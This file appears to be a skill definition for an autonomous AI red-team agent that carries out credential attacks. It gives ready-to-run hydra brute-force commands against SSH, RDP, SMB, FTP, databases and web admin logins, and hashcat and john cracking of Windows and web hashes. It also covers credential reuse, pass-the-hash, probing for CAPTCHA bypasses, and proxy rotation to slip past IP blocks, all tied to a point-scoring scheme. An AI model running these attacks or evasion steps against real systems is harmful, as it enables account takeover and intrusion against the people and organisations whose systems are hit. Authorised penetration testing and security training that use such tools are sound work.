---
name: credential-attack
description: Credential attacks: online weak-password brute force (hydra) and offline hash cracking (hashcat/john), covering SSH/FTP/RDP/SMB/databases/web admin panels
whenToUse: When a login entry is found (web admin/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis) and passwords need testing; or when hashes/ciphertext are obtained and plaintext recovery is needed
role: exploit
enabled: true
---

# Credential attacks (online brute force + offline cracking)

One of the two most reliable paths to "obtaining account access" in red-team work (the other is getting plaintext from config/source leaks).
**This skill only covers obtaining passwords**; after obtaining them, you must use skills `browser-automation` / `kimi-webbridge`
to **log in once in a real browser** before it counts as account access (red line: credentials alone do not count as account access).

## Local tools

| Tool | Path | Version | Purpose |
| --- | --- | --- | --- |
| **hydra** | `/usr/bin/hydra` | 9.7 | Online brute force, 50+ protocols |
| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | Offline hash cracking (GPU/CPU) |
| **john** | `/usr/sbin/john` | — | Offline cracking (auto format detection, simple setup) |

Wordlists: `/usr/share/wordlists/` (including `rockyou.txt`, which may need gunzip), `/usr/share/seclists/Passwords/`.
**If rockyou is missing, extract it first**: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` (requires authorization; if unavailable, use seclists).

## 1. Online brute force (hydra)

### General syntax
```bash
hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [module options] -t <concurrency> -f -o runs/hydra-<target>.txt
```
- `-L` username list / `-l` single username; `-P` password list / `-p` single password
- `-t` concurrency (**default 16; do not exceed 16**; many services will lock accounts or block IPs)
- `-f` stop on first hit (avoid locking accounts)
- `-o` write output to `runs/` (needed for report reproducibility)
- `-V` show each attempt (for debugging; do not enable in normal runs)

### Protocol examples
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt

# RDP (note: keep concurrency low; Windows may lock accounts)
hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt

# SMB
hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f

# FTP
hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f

# MySQL
hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f

# MSSQL
hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f

# Web form login (POST) — most common
hydra -L users.txt -P pass.txt target.example.com http-post-form \
  "/admin/login.jsp:username=^USER^&password=^PASS^:F=Invalid username or password" -t 8 -f -o runs/hydra-web-admin.txt

# Web form (with extra headers/HTTPS)
hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
```

### Web form success/failure detection (critical)
`http-post-form` third segment format: `"<path>:<POST body>:<failure condition>"`. **The failure condition must be accurate**, otherwise you get mass false positives:
- `F=<failure string>`: response containing this string means **failure** (recommended, most stable)
- `S=<success string>`: response containing this string means **success** (use when there is no consistent failure text)
- Manually send two requests first (one wrong password vs one correct password, or compare with a nonexistent user) to **confirm the marker is unique**, then run brute force.
- If there is CAPTCHA/slider verification: first check if it can be bypassed (fixed code, not validated, client-side only). If not bypassable, **do not brute force blindly** (skill `browser-automation` can do limited attempts with CAPTCHA handling); switch paths.

### Password list priority (key to saving time)
1. **Targeted small lists** (highest hit rate): combinations of organization name/brand/domain/year, e.g. `OrgAbbrev@2026`, `Admin@123`, `<domain>2026`; generate on the spot from title/organization info in `redteam_asset_query`.
2. **Default password lists**: product defaults (`admin/admin`, `tomcat/tomcat`, `weblogic/weblogic1`, `sa/sa`), refer to nuclei templates `http/default-logins/` (307), **check `redteam_poc_search` first**.
3. **Common weak-password TOP lists**: top-100 / 10-million etc. under `/usr/share/seclists/Passwords/Common-Credentials/`.
4. Use large generic dictionaries (rockyou) last—slow and noisy.

### Where usernames come from
- Web admin: error messages, default accounts in JS, `createBy` in API responses, login page hints, `robots.txt`, employee email prefixes;
- When directory brute force finds `/admin`, try `admin`, `administrator`, `system`, `test`, `guest` first;
- After obtaining one credential, do **credential reuse** first (see below)—much faster than brute force.

## 2. Offline cracking (hashcat / john)

After obtaining hashes/ciphertext (database, config files, `/etc/shadow`, web app DB), run offline—**no target-side traffic**, much safer than online brute force.

```bash
# 1) Identify hash type first
hashcat --identify hashes.txt

# 2) NTLM (Windows)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# 3) NetNTLMv2 (captured by Responder)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 4) MD5 / SHA1 (web app DB)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# 5) bcrypt (WordPress / PHP)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# 6) Rules (expand dictionary ~10x, best cost/performance)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 7) Mask attack (known password policy, e.g. 8 chars digit + uppercase)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
```

```bash
# john: easy format detection, config at ~/.john/john.conf
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Note**: this machine may not have a GPU, so `hashcat` on CPU will be slow—prefer rules + small dictionaries, or store hashes in `runs/` for later processing;
**do not spend hours cracking**; if it does not crack, use the hash directly (Pass-the-Hash, see skill `lateral-movement`).

## 3. Credential reuse (much faster than brute force; do first)

After obtaining any credential, **test it laterally first**; do not rush to brute force the next one:
1. Check existing credentials with `redteam_credential_list` (including username/password/source);
2. Try the same password against: other systems of the same type, admin panels on other assets, SSH/RDP/SMB/databases, VPN/bastion/ops platforms;
3. Try username patterns (`first.last`, employee ID, email prefix) with known passwords against other users on the same system;
4. Reuse hashes directly: PtH / Pass-the-Key (skill `lateral-movement`).

## 4. Discipline and boundaries (must follow)

1. **Check database first**: `redteam_credential_list` / `redteam_asset_query`—do not brute force the same entry repeatedly (for `blocked_count>0`, check the reason first).
2. **Lockout risk**: Windows (RDP/SMB) and OA/domain accounts require **strict rate limiting**: `-t 2` (Windows), `-t 4` (SSH/FTP), dictionaries at most ~100 entries; **stop after 5 consecutive failures on the same account**, switch account or target—locking accounts destroys entry points.
3. **Abandon after the same target is blocked >3 times total** (`redteam_asset_test` status=abandoned + blocked=true).
4. **Reduce noise via proxies**: use skill `cn-proxy-pool` to rotate egress IPs for web-form brute force; use suo5 tunnels for intranet targets.
5. **Prefer fscan for intranet**: for weak-password sweeps across intranet segments, hand off to skill `fscan-intranet` (batch brute force across 28 service types in one pass); use hydra for protocols fscan does not cover or single points needing fine control.

## 5. Output and recording (required)

1. **Immediately `redteam_credential_add` for each hit**:
   - `username`, **plaintext in `secret_value`** (shown directly in panel for reuse), `source` (`weak password`/`default password`/`credential reuse`/`leak`/`offline crack`),
     `tool` (actual command text, e.g. `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`), `secret_ref` (evidence file path such as `runs/hydra-ssh-10.0.0.5.txt`).
2. **Must verify login to score**: for web admin, use `browser-automation` / `kimi-webbridge` to log in once for real
   (open login page → enter credentials → confirm admin access → record page title/menu/current username → capture cookies as evidence) →
   `redteam_access_add` (`method=web-login`) → `redteam_score_hit` (`web-app` 10 points / `web-app` 20 points,
   `evidence` should state "asset | admin backend tomcat/Tomcat@2024").
   **If login fails, record the blocker in `redteam_asset_test` `test`** (hash not cracked/2FA required/source IP restricted/account disabled), no score.
3. **Account access is capped per service**: same asset and same port counts only once; obtaining admin gives full points for that service—do not farm multiple accounts on the same service.
4. For each key action, add `redteam_chain_add`: `stage_code=internet` (or `internal`),
   put the actual command in `tool` and output summary in `result` (e.g. `ssh 10.0.0.5 login succeeded as root/Root@123, uid=0(root)`).
5. Store hash files and cracking results under `runs/`.
